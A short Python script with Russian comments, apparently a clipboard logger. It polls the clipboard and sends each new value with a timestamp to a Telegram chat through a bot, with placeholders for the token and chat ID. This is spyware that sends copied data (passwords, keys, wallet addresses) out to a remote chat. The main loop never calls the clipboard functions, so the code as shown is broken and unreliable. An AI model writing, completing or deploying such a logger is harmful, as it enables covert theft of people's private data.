import telebot
import time
import pyperclip

bot = telebot.TeleBot('токен сюда')

chat_id = айди чата сюда #вместо букв вставь цифры 

def send_message_to_bot(message):
    bot.send_message(chat_id, message)

def check_clipboard():
    last_clipboard_content = ""
    while True:
        current_clipboard_content = pyperclip.paste()
        if current_clipboard_content != last_clipboard_content:
            last_clipboard_content = current_clipboard_content
            return current_clipboard_content
        time.sleep(1)

def send_message_on_clipboard_change(content):
    date = time.strftime("%d.%m.%Y")
    current_time = time.strftime("%H:%M:%S")
    message = f"Сегодняшняя дата - {date}\nСегодняшнее время - {current_time}\n\n{content}"
    send_message_to_bot(message)

if __name__ == '__main__':
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            time.sleep(15)